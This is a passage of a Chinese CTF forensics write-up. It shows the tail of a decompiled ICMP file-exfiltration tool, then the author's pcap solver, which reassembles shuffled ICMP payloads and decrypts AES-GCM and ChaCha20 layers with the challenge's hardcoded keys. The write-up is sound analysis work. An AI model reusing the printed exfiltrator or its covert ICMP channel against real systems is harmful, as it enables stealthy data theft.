</span></span><span class=line><span class=cl>    <span class=n>filepath</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>filepath</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;&#39;&#39;Error: File not found: </span><span class=si>{</span><span class=n>filepath</span><span class=si>}</span><span class=s1>&#39;&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exfil</span> <span class=o>=</span> <span class=n>BalancedExfiltrator</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>exfil</span><span class=o>.</span><span class=n>exfiltrate</span><span class=p>(</span><span class=n>filepath</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl><span class=c1># WARNING: Decompyle incomplete</span></span></span></code></pre></td></tr></table></div></div><p>翻看一下代码，代码大致的意思就是用icmp协议传输数据，并且传输过程中的数据是加密并且混淆过的</p><p>并且加密的时候要用到两个密钥，但是这里直接反编译是得不到密钥的</p><p>有两种方法得到这俩密钥，第一中就是直接010打开，拉到这一段的位置，可以看到明文的密钥</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20260113195109719.png alt=/posts/bb1da35/imgs/image-20260113195109719.png height=1258 width=1919></p><p>第二种方法就是直接把整个pyc文件发给GPT，顺便让它把解密代码也写了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>typing</span> <span class=kn>import</span> <span class=n>Dict</span><span class=p>,</span> <span class=n>Tuple</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span><span class=p>,</span> <span class=n>ChaCha20_Poly1305</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Protocol.KDF</span> <span class=kn>import</span> <span class=n>PBKDF2</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>scapy.all</span> <span class=kn>import</span> <span class=n>rdpcap</span><span class=p>,</span> <span class=n>ICMP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ----------------------------</span>
</span></span><span class=line><span class=cl><span class=c1># 1) 逆向加密逻辑类</span>
</span></span><span class=line><span class=cl><span class=c1># ----------------------------</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>CryptoRecoverer</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>master_seed</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>master_seed</span> <span class=o>=</span> <span class=n>master_seed</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_k1</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;Bloodharbor!2024&#34;</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_k2</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;Silent_Update!!!&#34;</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>_init_keys</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>_init_keys</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>base_material</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>master_seed</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>_k1</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>key_layer1</span> <span class=o>=</span> <span class=n>PBKDF2</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>base_material</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>_k2</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x01</span><span class=s2>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>dkLen</span><span class=o>=</span><span class=mi>32</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>count</span><span class=o>=</span><span class=mi>10000</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>key_layer2</span> <span class=o>=</span> <span class=n>PBKDF2</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>base_material</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>key_layer1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>_k2</span> <span class=o>+</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x02</span><span class=s2>&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>dkLen</span><span class=o>=</span><span class=mi>32</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>count</span><span class=o>=</span><span class=mi>10000</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ----------------------------</span>
</span></span><span class=line><span class=cl><span class=c1># 2) ICMP id/seq 与 chunk idx 的映射</span>
</span></span><span class=line><span class=cl><span class=c1># ----------------------------</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>calc_icmp_fields</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=n>Tuple</span><span class=p>[</span><span class=nb>int</span><span class=p>,</span> <span class=nb>int</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    val = (idx * 2654435769 + 305419896) &amp; 0xFFFFFFFF
</span></span></span><span class=line><span class=cl><span class=s2>    return (val &gt;&gt; 16) &amp; 0xFFFF, val &amp; 0xFFFF
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>val</span> <span class=o>=</span> <span class=p>(</span><span class=n>idx</span> <span class=o>*</span> <span class=mi>2654435769</span> <span class=o>+</span> <span class=mi>305419896</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFFFFFF</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>val</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFFFF</span><span class=p>,</span> <span class=n>val</span> <span class=o>&amp;</span> <span class=mh>0xFFFF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ----------------------------</span>
</span></span><span class=line><span class=cl><span class=c1># 3) 主解题流程</span>
</span></span><span class=line><span class=cl><span class=c1># ----------------------------</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_pcap</span><span class=p>(</span><span class=n>pcap_file</span><span class=p>:</span> <span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] 正在加载流量包 </span><span class=si>{</span><span class=n>pcap_file</span><span class=si>}</span><span class=s2> ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>packets</span> <span class=o>=</span> <span class=n>rdpcap</span><span class=p>(</span><span class=n>pcap_file</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>raw_chunks</span><span class=p>:</span> <span class=n>Dict</span><span class=p>[</span><span class=n>Tuple</span><span class=p>[</span><span class=nb>int</span><span class=p>,</span> <span class=nb>int</span><span class=p>],</span> <span class=nb>bytes</span><span class=p>]</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] 正在提取 ICMP Payload（仅 echo-request type=8）...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>pkt</span> <span class=ow>in</span> <span class=n>packets</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>pkt</span><span class=o>.</span><span class=n>haslayer</span><span class=p>(</span><span class=n>ICMP</span><span class=p>)</span> <span class=ow>and</span> <span class=n>pkt</span><span class=p>[</span><span class=n>ICMP</span><span class=p>]</span><span class=o>.</span><span class=n>type</span> <span class=o>==</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># 原脚本加入了 16 字节前缀，需去除</span>
</span></span><span class=line><span class=cl>            <span class=n>payload</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>pkt</span><span class=p>[</span><span class=n>ICMP</span><span class=p>]</span><span class=o>.</span><span class=n>payload</span><span class=p>)[</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>            <span class=n>raw_chunks</span><span class=p>[(</span><span class=nb>int</span><span class=p>(</span><span class=n>pkt</span><span class=p>[</span><span class=n>ICMP</span><span class=p>]</span><span class=o>.</span><span class=n>id</span><span class=p>),</span> <span class=nb>int</span><span class=p>(</span><span class=n>pkt</span><span class=p>[</span><span class=n>ICMP</span><span class=p>]</span><span class=o>.</span><span class=n>seq</span><span class=p>))]</span> <span class=o>=</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>raw_chunks</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] 错误: 没有提取到任何 ICMP echo-request 数据。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 1) 寻找 Metadata (EX1L)</span>
</span></span><span class=line><span class=cl>    <span class=n>metadata</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=n>meta_key</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>pid</span><span class=p>,</span> <span class=n>pseq</span><span class=p>),</span> <span class=n>data</span> <span class=ow>in</span> <span class=n>raw_chunks</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>data</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;EX1L&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>metadata</span> <span class=o>=</span> <span class=n>data</span>
</span></span><span class=line><span class=cl>            <span class=n>meta_key</span> <span class=o>=</span> <span class=p>(</span><span class=n>pid</span><span class=p>,</span> <span class=n>pseq</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 找到元数据块! ID: </span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>, Seq: </span><span class=si>{</span><span class=n>pseq</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>metadata</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] 错误: 未找到 EX1L 元数据。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 解析元数据：crypto_seed(16) + scramble_seed(u32, big)</span>
</span></span><span class=line><span class=cl>    <span class=n>crypto_seed</span> <span class=o>=</span> <span class=n>metadata</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>20</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>scramble_seed</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>metadata</span><span class=p>[</span><span class=mi>20</span><span class=p>:</span><span class=mi>24</span><span class=p>],</span> <span class=s2>&#34;big&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Crypto Seed: </span><span class=si>{</span><span class=n>crypto_seed</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] Scramble Seed: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>scramble_seed</span><span class=p>)</span><span class=si>}</span><span class=s2> (</span><span class=si>{</span><span class=n>scramble_seed</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 2) 根据 calc_icmp_fields(idx) 抽取所有加密块（idx 从 1 开始递增，直到断档）</span>
</span></span><span class=line><span class=cl>    <span class=n>data_chunks_indexed</span><span class=p>:</span> <span class=n>Dict</span><span class=p>[</span><span class=nb>int</span><span class=p>,</span> <span class=nb>bytes</span><span class=p>]</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>target_id</span><span class=p>,</span> <span class=n>target_seq</span> <span class=o>=</span> <span class=n>calc_icmp_fields</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>k</span> <span class=o>=</span> <span class=p>(</span><span class=n>target_id</span><span class=p>,</span> <span class=n>target_seq</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>k</span> <span class=ow>in</span> <span class=n>raw_chunks</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>data_chunks_indexed</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>raw_chunks</span><span class=p>[</span><span class=n>k</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>num_data_chunks</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>data_chunks_indexed</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 成功提取到 </span><span class=si>{</span><span class=n>num_data_chunks</span><span class=si>}</span><span class=s2> 个有效加密块&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>num_data_chunks</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] 错误: 没有提取到任何有效 chunk（请确认 pcap 里是否丢包/筛选是否正确）。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 3) 还原 Shuffle 混淆顺序（按 PDF）</span>
</span></span><span class=line><span class=cl>    <span class=n>rng</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>Random</span><span class=p>(</span><span class=n>scramble_seed</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>indices</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=n>num_data_chunks</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>rng</span><span class=o>.</span><span class=n>shuffle</span><span class=p>(</span><span class=n>indices</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>reordered_chunks</span> <span class=o>=</span> <span class=p>[</span><span class=kc>None</span><span class=p>]</span> <span class=o>*</span> <span class=n>num_data_chunks</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>new_pos</span><span class=p>,</span> <span class=n>orig_idx</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>indices</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># new_pos 是“混淆后位置”，orig_idx 是“原始位置”</span>
</span></span><span class=line><span class=cl>        <span class=c1># data_chunks_indexed 的 idx 从 1 开始</span>
</span></span><span class=line><span class=cl>        <span class=n>reordered_chunks</span><span class=p>[</span><span class=n>orig_idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>data_chunks_indexed</span><span class=p>[</span><span class=n>new_pos</span> <span class=o>+</span> <span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 拼接得到 full_blob</span>
</span></span><span class=line><span class=cl>    <span class=n>full_blob</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>reordered_chunks</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 4) 解密流程</span>
</span></span><span class=line><span class=cl>    <span class=n>recoverer</span> <span class=o>=</span> <span class=n>CryptoRecoverer</span><span class=p>(</span><span class=n>crypto_seed</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># --- Layer 2: AES-GCM ---</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] 正在尝试解密 Layer 2 (AES-GCM)...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>full_blob</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] full_blob 太短，无法包含 nonce+tag。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>nonce2</span> <span class=o>=</span> <span class=n>full_blob</span><span class=p>[:</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>tag2</span> <span class=o>=</span> <span class=n>full_blob</span><span class=p>[</span><span class=mi>16</span><span class=p>:</span><span class=mi>32</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>ct2</span> <span class=o>=</span> <span class=n>full_blob</span><span class=p>[</span><span class=mi>32</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>layer1_result</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>225</span><span class=p>):</span>  <span class=c1># 最多回退 224 字节</span>
</span></span><span class=line><span class=cl>        <span class=n>test_ct2</span> <span class=o>=</span> <span class=n>ct2</span> <span class=k>if</span> <span class=n>i</span> <span class=o>==</span> <span class=mi>0</span> <span class=k>else</span> <span class=n>ct2</span><span class=p>[:</span><span class=o>-</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>cipher2</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>recoverer</span><span class=o>.</span><span class=n>key_layer2</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_GCM</span><span class=p>,</span> <span class=n>nonce</span><span class=o>=</span><span class=n>nonce2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>layer1_result</span> <span class=o>=</span> <span class=n>cipher2</span><span class=o>.</span><span class=n>decrypt_and_verify</span><span class=p>(</span><span class=n>test_ct2</span><span class=p>,</span> <span class=n>tag2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Layer 2 解密成功! (剔除了 </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2> 字节填充)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>ValueError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>layer1_result</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Layer 2 解密失败：MAC 校验不匹配。请检查是否有丢包或字节偏移。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># --- Layer 1: ChaCha20-Poly1305 ---</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] 正在尝试解密 Layer 1 (ChaCha20-Poly1305)...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>layer1_result</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>28</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] layer1_result 太短，无法包含 nonce+tag。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>nonce1</span> <span class=o>=</span> <span class=n>layer1_result</span><span class=p>[:</span><span class=mi>12</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>tag1</span> <span class=o>=</span> <span class=n>layer1_result</span><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=mi>28</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>ct1</span> <span class=o>=</span> <span class=n>layer1_result</span><span class=p>[</span><span class=mi>28</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>final_data</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>225</span><span class=p>):</span>
